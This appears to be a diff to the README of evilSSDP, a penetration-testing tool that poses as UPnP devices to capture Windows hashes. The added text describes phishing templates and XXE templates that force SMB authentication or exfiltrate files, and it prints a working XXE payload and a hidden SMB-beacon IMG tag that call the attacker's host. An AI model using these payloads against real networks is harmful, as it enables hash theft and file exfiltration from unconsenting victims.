@@ -3,6 +3,10 @@ This tool responds to SSDP multicast discover requests, posing as a generic UPNP
 
 This works against Windows 10 systems (even if they have disabled NETBIOS and LLMNR) and requires no existing credentials to execute.
 
+As a bonus, this tool can also detect an exploit potential zero-day vulnerabilities in the XML parsing engines of various UPNP devices. To try this, use the 'xxe-smb' template. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share with NO USER INTERACTION required via an XLM External Entity (XXE) attack. If you get lucky and find one of those, you can probably snag yourself a nice snazzy CVE (please reference evilSSDP in the disclosure if you do).
+
+If you are feeling brave, play around with the 'xxe-exfil' template. It works against Windows hosts to exfiltrate files with only 1 line of text. After 1 line, it breaks the required URL that sends you the file contents.
+
 ![Demo Video](ssdp.mp4)
 
 # Usage
@@ -36,6 +40,14 @@ optional arguments:
   -s SMB, --smb SMB     IP address of your SMB server. Defalts to the primary
                         address of the "interface" provided.
   ```
+
+# Templates
+The following templates come with the tool. If you have good design skills, please contribute one of your own!
+
+- `bitcoin`:    Will show up in Windows Explorer as "Bitcoin Wallet". Phishing page is just a random set of Bitcoin private/public/address info. There are no actual funds in these accounts.
+- `password-vault`: Will show up in Windows Explorer as "IT Password Vault". Phishing page contains a short list of fake passwords / ssh keys / etc.
+- `xxe-smb`: Will not likely show up in Windows Explorer. Used for finding zero day vulnerabilities in XML parsers. Will trigger an "XXE - VULN" alert in the UI for hits and will attempt to force clients to authenticate with the SMB server, with 0 interaction.
+- `xxe-exfil`: Another example of searching for XXE vulnerabilities, but this time attempting to exfiltrate the a test file from a Windows host. Of course you can customize this to look for whatever specific file you are after, Windows or Linux. If you get this working on multi-line files, PLEASE let me know how you did it.
 
 # Technical Details
 Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.
@@ -110,6 +122,25 @@ The IMG tage looks like this:
 ```
 <img src="file://///$localIp/smb/hash.jpg" style="display: none;" /><br>
 ```
+
+# Zero-Day Hunting
+By default, this tool essentially forces devices on the network to parse an XML file. A well-known attack against applications that parse XML exists - [XML External Entity Processing (XXE)](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing).
+
+This type of attack against UPNP devices in likely overlooked - simply because the attack method is complex and not readily apparent. However, evilSSDP makes it very easy to test for vulnerable devices on your network. Simply run the tool and look for a big `[XXE VULN!!!]` in the output. NOTE: using the xxe template will likely not spawn visibile evil devices across the LAN, it is meant only for zero-interaction scenarios.
+
+This is accomplished by providing a Device Descriptor XML file with the following content:
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ 
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file://///$smbServer/smb/hash.jpg" >
+<!ENTITY xxe-url SYSTEM "http://$localIp:$localPort/ssdp/xxe.html" >
+]>
+<hello>&xxe;&xxe-url;</hello>
+```
+
+When a vulnerable XML parser reads this file, it will automatically mount the SMB share (allowing you to crack the hash or relay) as well as access an HTTP URL to notify you it was discovered. The notification will contain the HTTP headers and an IP address, which should give you some info on the vulnerable application. If you see this, please do contact the vendor to fix the issue. Also, I would love to hear about any zero days you find using the tool.
 
 # Customization
 This is an early beta, but constructed in such a way to allow easy template creation in the future. I've included two very basic templates - simply duplicate a template folder and customize for your own use. Then use the '-t' parameter to choose your new template.
